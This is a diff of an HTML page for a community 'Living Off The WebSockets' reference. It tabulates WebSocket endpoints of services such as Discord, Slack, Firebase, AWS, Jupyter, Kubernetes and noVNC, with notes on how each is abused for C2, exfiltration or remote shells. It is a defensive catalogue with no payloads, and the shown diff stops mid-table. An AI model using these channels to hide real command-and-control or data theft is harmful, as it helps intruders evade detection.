@@ -2,8 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, initial-scale=1, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>LOTWebSockets - Living Off The WebSockets</title>
+    <meta name="description" content="A community-driven reference of WebSocket endpoints and tools that can be abused for C2, tunneling, and data exfiltration.">
     <link rel="icon" type="image/x-icon" href="/assets/favicon.ico">
     <style>
         /* Google Fonts */
@@ -111,9 +112,9 @@
 
         /* Table Styling */
         table {
-            width: 100%;
-            max-width: 900px;
-            margin: 20px 0;
+            width: 95%;
+            max-width: 1000px;
+            margin: 20px 0 40px;
             border-collapse: collapse;
             background: #333; /* Dark background for table */
             color: #ffffff; /* White text color */
@@ -126,6 +127,7 @@
             padding: 15px;
             text-align: left;
             border-bottom: 1px solid #444; /* Dark border */
+            vertical-align: top;
         }
 
         th {
@@ -138,6 +140,32 @@
         tr:hover {
             background-color: #3a3a3a; /* Darker background on hover */
         }
+
+        .name-cell { font-weight: 700; }
+        .endpoint-cell code {
+            background: #1a1a1a;
+            color: #66ffff;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            word-break: break-all;
+        }
+        .abuse-cell { color: #cfcfcf; font-size: 0.9rem; }
+        .dir-tag { color: #888; font-size: 0.82rem; }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 9px;
+            border-radius: 999px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            white-space: nowrap;
+        }
+        .status-documented { background: rgba(0, 220, 120, 0.15); color: #2ee88c; border: 1px solid rgba(0,220,120,0.4); }
+        .status-poc { background: rgba(255, 204, 0, 0.15); color: #ffd84d; border: 1px solid rgba(255,204,0,0.4); }
+        .status-concept { background: rgba(150, 150, 150, 0.15); color: #bbbbbb; border: 1px solid #555; }
+        .status-unofficial { background: rgba(0, 150, 255, 0.15); color: #5bb8ff; border: 1px solid rgba(0,150,255,0.4); }
+        .status-note { background: rgba(255,255,255,0.08); color: #999; border: 1px solid #444; }
 
         /* Footer Styling */
         footer {
@@ -205,17 +233,10 @@
         function filtersockets() {
             const query = document.getElementById('searchBox').value.toLowerCase();
             const rows = document.querySelectorAll('#sockets tbody tr');
-            
+
             rows.forEach(row => {
-                const commandName = row.cells[0].textContent.toLowerCase();
-                const command = row.cells[1].textContent.toLowerCase();
-                const type = row.cells[2].textContent.toLowerCase();
-                
-                if (commandName.includes(query) || command.includes(query) || type.includes(query)) {
-                    row.style.display = '';
-                } else {
-                    row.style.display = 'none';
-                }
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(query) ? '' : 'none';
             });
         }
     </script>
@@ -229,13 +250,13 @@
 
 <div class="header-box">
     <a href="https://github.com/LOTWebSockets/LOTWebSockets.github.io/blob/main/README.md">
-        <img src="assets/logo.jpg" alt="Living Off The WebHooks" width="800px">
+        <img src="assets/logo.jpg" alt="Living Off The WebSockets" width="120">
     </a>
     <div>
         <h2>Living Off The WebSockets</h2>
-        <h4>Abusing WebSockets for Data Exfiltration & C2 Communications</h4>
+        <h4>Abusing WebSockets for Data Exfiltration &amp; C2 Communications</h4>
         <p>
-            <strong>LOTWebSockets</strong> is a community-driven project documenting websockets that may be exploited for data exfiltration and C2 communications. 
+            <strong>LOTWebSockets</strong> is a community-driven project documenting websockets that may be exploited for data exfiltration and C2 communications.
             <a href="https://github.com/LOTWebSockets/LOTWebSockets.github.io/tree/main" style="color: #00ccff;">Contribution guide</a>.
         </p>
     </div>
@@ -247,195 +268,763 @@
     <thead>
         <tr>
             <th>Websocket Name</th>
-            <th>URL</th>
-            <th>Type</th>
-            <th>Reference</th>
+            <th>Endpoint</th>
+            <th>Abuse</th>
+            <th>Status</th>
         </tr>
     </thead>
     <tbody>
 
         <tr>
-            <td>ntfy.sh</td>
-            <td><code>wss://ntfy.sh/{topic}/ws</code></td>
-            <td>WSS</td>
-            <td>https://ntfy.sh/</td>
-        </tr>
-
-         <tr>
-            <td>Gotify</td>
-            <td><code>wss://{host}/stream?token=</code></td>
-            <td>WSS</td>
-            <td>https://gotify.net/</td>
-        </tr>
-
-        <tr>
-            <td>Postman Echo </td>
-            <td><code>wss://ws.postman-echo.com</code></td>
-            <td>WSS</td>
-            <td>https://postman.com/</td>
-        </tr>
-
-
-        <tr>
-            <td>Pusher Sandbox </td>
-            <td><code>`wss://ws-{cluster}.pusher.com/app/{key}`</code></td>
-            <td>WSS</td>
-            <td>https://pusher.com/</td>
-        </tr>
-
-        <tr>
-            <td>Websocket.org Echo </td>
-            <td><code>wss://echo.websocket.org</code></td>
-            <td>WSS</td>
-            <td>https://websocket.org/</td>
-        </tr>
-
-        <tr>
-            <td>Centrifugo</td>
-            <td><code>wss://*.centrifugo.*</code></td>
-            <td>WSS</td>
-            <td>https://centrifugo.com/</td>
-        </tr>
-
-        <tr>
-            <td>Centrifugo</td>
-            <td><code>wss://*.centrifugo.*</code></td>
-            <td>WSS</td>
-            <td>https://centrifugo.com/</td>
-        </tr>
-
-        <tr>
-            <td>Stream.io</td>
-            <td><code>wss://realtime-stream.*</code></td>
-            <td>Web</td>
-            <td>https://stream.io/</td>
-        </tr>
-  
-        <tr>
-            <td>PieSocket Demo</td>
-            <td><code>wss://demo.piesocket.com/*</code></td>
-            <td>WSS</td>
-            <td>https://piehost.com/</td>
-        </tr>
-
-        <tr>
-            <td>SocketsBay</td>
-            <td><code>wss://socketsbay.com/*</code></td>
-            <td>WSS</td>
-            <td>https://socketsbay.com/</td>
-        </tr>
-
-        <tr>
-            <td>Yjs</td>
-            <td><code>wss://demos.yjs.dev/*</code></td>
-            <td>WSS</td>
-            <td>https://yjs.dev/</td>
-        </tr>
-
-        <tr>
-            <td>Ably Realtime</td>
-            <td><code>wss://realtime.ably.io/*</code></td>
-            <td>WSS</td>
-            <td>https://ably.io/</td>
-        </tr>
-
-        <tr>
-            <td>Discord</td>
-            <td><code>wss://gateway.discord.gg</code></td>
-            <td>WSS</td>
-            <td>https://discord.com/</td>
-        </tr>
-
-        <tr>
-            <td>Slack</td>
-            <td><code>wss://wss-primary.slack.com</code></td>
-            <td>WSS</td>
-            <td>https://slack.com/</td>
-        </tr>
-
-        <tr>
-            <td>Matrix</td>
-            <td><code>wss://matrix-client.matrix.org</code></td>
-            <td>WSS</td>
-            <td>https://matrix.org/</td>
-        </tr>
-
-        <tr>
-            <td>Mattermost</td>
-            <td><code>wss://{host}/api/v4/websocket</code></td>
-            <td>WSS</td>
-            <td>https://mattermost.com/</td>
-        </tr>
-
-        <tr>
-            <td>Rocker.Chat</td>
-            <td><code>wss://{host}/websocket</code></td>
-            <td>WSS</td>
-            <td>https://rocket.chat/</td>
-        </tr>
-
-        <tr>
-            <td>IRC-over-WebSocket gateways (KiwiIRC, The Lounge, Convos, IRCCloud)</td>
-            <td><code>wss://{gateway}/</code></td>
-            <td>WSS</td>
-            <td>NA</td>
-        </tr>
-
-        <tr>
-            <td>Jitsi Meet</td>
-            <td><code>wss://meet.jit.si/xmpp-websocket</code></td>
-            <td>WSS</td>
-            <td>https://jitsi.org/</td>
-        </tr>
-
-        <tr>
-            <td>Twitch</td>
-            <td><code>wss://irc-ws.chat.twitch.tv</code></td>
-            <td>WSS</td>
-            <td>https://twitch.tv/</td>
+            <td class="name-cell">ntfy.sh</td>
+            <td class="endpoint-cell"><code>wss://ntfy.sh/{topic}/ws</code></td>
+            <td class="abuse-cell">Free anonymous pub/sub topics = instant C2/exfil channel; attachments up to 15 MB <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
         </tr>
         <tr>
-            <td>Twitch</td>
-            <td><code>wss://pubsub-edge.twitch.tv</code></td>
-            <td>WSS</td>
-            <td>https://twitch.tv/</td>
+            <td class="name-cell">Gotify</td>
+            <td class="endpoint-cell"><code>wss://{host}/stream?token=</code></td>
+            <td class="abuse-cell">Same pub/sub model, self-hosted or public instances <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
         </tr>
-
         <tr>
-            <td>Kick</td>
-            <td><code>wss://ws-us2.kick.com</code></td>
-            <td>WSS</td>
-            <td>https://kick.com/</td>
+            <td class="name-cell">Pipedream</td>
+            <td class="endpoint-cell"><code>wss://ws.pipedream.net/{channel}</code></td>
+            <td class="abuse-cell">Free relay; arbitrary channel names <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
         </tr>
-
         <tr>
-            <td>Stream Chat</td>
-            <td><code>wss://steam-chat.com/chat/ogg</code></td>
-            <td>WSS</td>
-            <td>https://stream-chat.com/</td>
+            <td class="name-cell">Postman Echo</td>
+            <td class="endpoint-cell"><code>wss://ws.postman-echo.com</code></td>
+            <td class="abuse-cell">Beacon/connectivity checks, rendezvous <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented (used by malware)</span></td>
         </tr>
-
         <tr>
-            <td>WhatsApp Web</td>
-            <td><code>wss://web.whatsapp.com/ws</code></td>
-            <td>WSS</td>
-            <td>https://web.whatsapp.com/</td>
+            <td class="name-cell">PieHost Echo</td>
+            <td class="endpoint-cell"><code>wss://echo.websocket.events</code></td>
+            <td class="abuse-cell">Broadcast "rooms" = free anonymous relay/dead drop <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
         </tr>
-
         <tr>
-            <td>Notion</td>
-            <td><code>wss://msgstore.www.notion.so</code></td>
-            <td>WSS</td>
-            <td>https://www.notion.so/</td>
+            <td class="name-cell">PieSocket demo</td>
+            <td class="endpoint-cell"><code>wss://demo.piesocket.com/v3/channel/{name}</code></td>
+            <td class="abuse-cell">Free demo channel = public pub/sub <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
         </tr>
-
         <tr>
-            <td>Azure DevOps</td>
-            <td><code>wss://*.service.signalr.net</code></td>
-            <td>WSS</td>
-            <td>https://azure.microsoft.com/services/devops/</td>
+            <td class="name-cell">Ably free tier</td>
+            <td class="endpoint-cell"><code>wss://realtime.ably.io</code></td>
+            <td class="abuse-cell">Pub/sub with free API keys <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
         </tr>
-
+        <tr>
+            <td class="name-cell">Pusher sandbox</td>
+            <td class="endpoint-cell"><code>wss://ws-{cluster}.pusher.com/app/{key}</code></td>
+            <td class="abuse-cell">Free app keys, public channels <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">websocket.org echo (defunct)</td>
+            <td class="endpoint-cell"><code>wss://echo.websocket.org</code></td>
+            <td class="abuse-cell">Historical: malware reachability beacon <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented (historical)</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Centrifugo / Stream.io / PubNub free tiers</td>
+            <td class="endpoint-cell"><code>wss://*.centrifugo.*</code>, <code>wss://realtime-stream.*</code></td>
+            <td class="abuse-cell">Free pub/sub tiers as relays <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Discord</td>
+            <td class="endpoint-cell"><code>wss://gateway.discord.gg</code></td>
+            <td class="abuse-cell">Bot gateway = C2 channel; file attachments for exfil; heavily abused by RATs/loaders <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Slack</td>
+            <td class="endpoint-cell"><code>wss://wss-primary.slack.com</code> (RTM)</td>
+            <td class="abuse-cell">C2 via Slackor-class tools; file uploads for exfil <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Matrix</td>
+            <td class="endpoint-cell"><code>wss://matrix-client.matrix.org</code></td>
+            <td class="abuse-cell">E2EE rooms as covert channel; self-hosted Synapse variants <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Mattermost</td>
+            <td class="endpoint-cell"><code>wss://{host}/api/v4/websocket</code></td>
+            <td class="abuse-cell">Self-hosted team chat abused as C2 <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Rocket.Chat</td>
+            <td class="endpoint-cell"><code>wss://{host}/websocket</code> (DDP)</td>
+            <td class="abuse-cell">Same; Meteor DDP over WS <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">IRC-over-WebSocket gateways (KiwiIRC, The Lounge, Convos, IRCCloud)</td>
+            <td class="endpoint-cell"><code>wss://{gateway}/</code></td>
+            <td class="abuse-cell">Classic botnet C2 reborn over WS through legit gateways <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented (IRC C2) / PoC (WS)</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Jitsi Meet</td>
+            <td class="endpoint-cell"><code>wss://meet.jit.si/xmpp-websocket</code></td>
+            <td class="abuse-cell">XMPP over WS; chat rooms as rendezvous <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Twitch</td>
+            <td class="endpoint-cell"><code>wss://irc-ws.chat.twitch.tv</code>, <code>wss://pubsub-edge.twitch.tv</code></td>
+            <td class="abuse-cell">Chat-driven C2, blends in gaming traffic <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Kick</td>
+            <td class="endpoint-cell"><code>wss://ws-us2.kick.com</code></td>
+            <td class="abuse-cell">Same model <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Steam Chat</td>
+            <td class="endpoint-cell"><code>wss://steam-chat.com/chat/ogg</code></td>
+            <td class="abuse-cell">Chat-driven covert channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial/PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">WhatsApp Web</td>
+            <td class="endpoint-cell"><code>wss://web.whatsapp.com/ws</code></td>
+            <td class="abuse-cell">Baileys-class libs; message channel + media exfil <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial/Documented (libs widely abused)</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Microsoft Teams / Zoom / Webex (Web SDKs)</td>
+            <td class="endpoint-cell">various <code>wss://</code></td>
+            <td class="abuse-cell">Chat signaling abused as channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Google Docs/Sheets realtime</td>
+            <td class="endpoint-cell">internal <code>wss://</code> bind streams</td>
+            <td class="abuse-cell">Protobuf realtime streams abused for exfil <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Notion</td>
+            <td class="endpoint-cell"><code>wss://msgstore.www.notion.so</code></td>
+            <td class="abuse-cell">Realtime msgstore channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Figma</td>
+            <td class="endpoint-cell"><code>wss://www.figma.com/...</code> realtime</td>
+            <td class="abuse-cell">Collaborative editing channel as covert transport <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">GitHub</td>
+            <td class="endpoint-cell"><code>wss://github.com/cable</code> (ActionCable)</td>
+            <td class="abuse-cell">Live UI channel; codespaces port-forward <code>wss://*.app.github.dev</code> <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">GitLab</td>
+            <td class="endpoint-cell"><code>wss://gitlab.com/cable</code>, CI job web terminal <code>wss://.../-/jobs/.../terminal.ws</code></td>
+            <td class="abuse-cell">Live UI + interactive CI terminal over WS <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Azure DevOps</td>
+            <td class="endpoint-cell">SignalR hubs <code>wss://*.service.signalr.net</code></td>
+            <td class="abuse-cell">Live updates channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Collaborative editors: CryptPad, Etherpad, Overleaf, Excalidraw, tldraw</td>
+            <td class="endpoint-cell"><code>wss://{host}</code></td>
+            <td class="abuse-cell">Document/room ID as anonymous dead drop or low-bandwidth channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Audience/game platforms: Kahoot, Mentimeter, Slido, Quizizz</td>
+            <td class="endpoint-cell"><code>wss://</code> session sockets</td>
+            <td class="abuse-cell">Session/pin-based anonymous pub/sub = covert channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Online chess (Lichess <code>wss://socket.lichess.org</code>, chess.com)</td>
+            <td class="endpoint-cell">game sockets</td>
+            <td class="abuse-cell">Move notation as steganographic channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">AWS API Gateway (WebSocket APIs)</td>
+            <td class="endpoint-cell"><code>wss://{api-id}.execute-api.{region}.amazonaws.com/{stage}</code></td>
+            <td class="abuse-cell">Attacker spins up WS API on amazonaws.com — egress looks like AWS traffic <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">AWS IoT Core (MQTT over WS)</td>
+            <td class="endpoint-cell"><code>wss://{endpoint}/mqtt</code> (SigV4)</td>
+            <td class="abuse-cell">MQTT C2 riding AWS domain <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Azure Web PubSub</td>
+            <td class="endpoint-cell"><code>wss://{host}.webpubsub.azure.com/client/hubs/{hub}</code></td>
+            <td class="abuse-cell">Hub = free relay on azure.com <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Azure SignalR Service</td>
+            <td class="endpoint-cell"><code>wss://{host}.service.signalr.net/client/?hub=...</code></td>
+            <td class="abuse-cell">Negotiate+WS relay <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Azure IoT Hub</td>
+            <td class="endpoint-cell"><code>wss://{hub}.azure-devices.net/$iothub/websocket</code></td>
+            <td class="abuse-cell">Device shadow/twin C2 <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Firebase Realtime Database</td>
+            <td class="endpoint-cell"><code>wss://{project}.firebaseio.com/.ws</code></td>
+            <td class="abuse-cell">Anonymous DB writes = exfil store; Google domain <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Firebase Firestore</td>
+            <td class="endpoint-cell"><code>wss://firestore.googleapis.com/.../Listen/channel</code></td>
+            <td class="abuse-cell">Webchannel listen streams <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Supabase Realtime</td>
+            <td class="endpoint-cell"><code>wss://{project}.supabase.co/realtime/v1/websocket</code></td>
+            <td class="abuse-cell">Postgres logical replication over WS = relay <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Cloudflare Workers (WebSockets)</td>
+            <td class="endpoint-cell"><code>wss://{worker}.{subdomain}.workers.dev</code></td>
+            <td class="abuse-cell">Serverless WS C2 on trusted CF domains <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Cloudflare Tunnel</td>
+            <td class="endpoint-cell"><code>trycloudflare.com</code> quick tunnels</td>
+            <td class="abuse-cell">Free ephemeral inbound tunnel (also serves WS) <span class="dir-tag">(EXT→INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Hasura Cloud / generic GraphQL subscriptions (<code>graphql-ws</code> protocol)</td>
+            <td class="endpoint-cell"><code>wss://{host}/v1/graphql</code></td>
+            <td class="abuse-cell">Subscription payloads as covert channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">MongoDB Atlas App Services</td>
+            <td class="endpoint-cell"><code>wss://realm.mongodb.com</code> watch streams</td>
+            <td class="abuse-cell">Change streams as channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Convex / Appwrite Realtime / Nhost / PocketBase / Parse LiveQuery</td>
+            <td class="endpoint-cell"><code>wss://{project}.*</code></td>
+            <td class="abuse-cell">BaaS realtime channels as relays <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Replit</td>
+            <td class="endpoint-cell">IDE <code>wss://</code> + hosted app endpoints</td>
+            <td class="abuse-cell">Malware dev/hosting; app WS endpoints as C2 <span class="dir-tag">(INT→EXT / EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">GitHub Codespaces</td>
+            <td class="endpoint-cell"><code>wss://*.app.github.dev</code> (forwarded ports)</td>
+            <td class="abuse-cell">Port-forwarded WS services on github.dev domains <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">VS Code Tunnels</td>
+            <td class="endpoint-cell"><code>wss://*.tunnels.api.visualstudio.com</code></td>
+            <td class="abuse-cell"><code>code tunnel</code> = instant remote access; insider pivot <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Gitpod / CodeSandbox / StackBlitz</td>
+            <td class="endpoint-cell">workspace <code>wss://</code></td>
+            <td class="abuse-cell">Dev workspaces as hosting/pivot <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">code-server (Coder), JupyterHub (see E), JetBrains Remote Dev</td>
+            <td class="endpoint-cell"><code>wss://</code></td>
+            <td class="abuse-cell">Remote dev environments as C2 foothold <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">ttyd</td>
+            <td class="endpoint-cell"><code>wss://{host}:7681</code></td>
+            <td class="abuse-cell">Web terminal = direct shell <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">GoTTY / Wetty / WebSSH2 / Sshwifty</td>
+            <td class="endpoint-cell"><code>ws(s)://{host}</code></td>
+            <td class="abuse-cell">Web shells/SSH bridges <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Apache Guacamole</td>
+            <td class="endpoint-cell"><code>wss://{host}/guacamole/websocket-tunnel</code></td>
+            <td class="abuse-cell">RDP/SSH/VNC through WS tunnel <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">noVNC / websockify / KasmVNC</td>
+            <td class="endpoint-cell"><code>wss://{host}:6080</code></td>
+            <td class="abuse-cell">Generic WS↔TCP bridge to ANY internal service (RDP, VNC, databases) <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Jupyter (Lab/Server/Hub)</td>
+            <td class="endpoint-cell"><code>wss://{host}/api/kernels/{id}/channels?token=</code></td>
+            <td class="abuse-cell">Execute code in kernels via WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">ComfyUI (ML)</td>
+            <td class="endpoint-cell"><code>wss://{host}/ws</code></td>
+            <td class="abuse-cell">Workflow API over WS; commonly exposed <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Gradio / Streamlit</td>
+            <td class="endpoint-cell"><code>wss://{host}/queue/join</code>, <code>/_stcore/stream</code></td>
+            <td class="abuse-cell">ML app internals over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Open WebUI / LibreChat (self-hosted AI)</td>
+            <td class="endpoint-cell"><code>wss://{host}/socket.io/</code></td>
+            <td class="abuse-cell">AI chat UIs = WS-rich pivot <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Code-server</td>
+            <td class="endpoint-cell"><code>wss://{host}:8080</code></td>
+            <td class="abuse-cell">Full VS Code in browser <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Portainer</td>
+            <td class="endpoint-cell"><code>wss://{host}:9443/api/websocket/exec</code></td>
+            <td class="abuse-cell">Container exec over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Rancher</td>
+            <td class="endpoint-cell"><code>wss://{host}/v3/subscribe</code></td>
+            <td class="abuse-cell">Cluster management WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Kubernetes API</td>
+            <td class="endpoint-cell"><code>wss://{api}/api/v1/namespaces/{ns}/pods/{pod}/exec</code></td>
+            <td class="abuse-cell">kubectl exec/port-forward over WebSocket (K8s 1.31+) <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">LXD/Incus</td>
+            <td class="endpoint-cell"><code>wss://{host}:8443/1.0/instances/{name}/exec</code></td>
+            <td class="abuse-cell">Container exec/console over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Proxmox VE</td>
+            <td class="endpoint-cell"><code>wss://{host}:8006/api2/json/nodes/{n}/{vm}/vncwebsocket</code></td>
+            <td class="abuse-cell">VM console over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">oVirt/OpenNebula</td>
+            <td class="endpoint-cell">noVNC websockify paths</td>
+            <td class="abuse-cell">VM console pivot <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Cockpit</td>
+            <td class="endpoint-cell"><code>wss://{host}:9090/cockpit/socket</code></td>
+            <td class="abuse-cell">Linux admin channel protocol over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">TrueNAS middlewared</td>
+            <td class="endpoint-cell"><code>wss://{host}/websocket</code></td>
+            <td class="abuse-cell">Full NAS admin API over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Unraid</td>
+            <td class="endpoint-cell">webGUI WS</td>
+            <td class="abuse-cell">Admin operations over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Teleport / Boundary</td>
+            <td class="endpoint-cell"><code>wss://{proxy}:3080</code></td>
+            <td class="abuse-cell">Infra access proxy abuse <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Traefik dashboard</td>
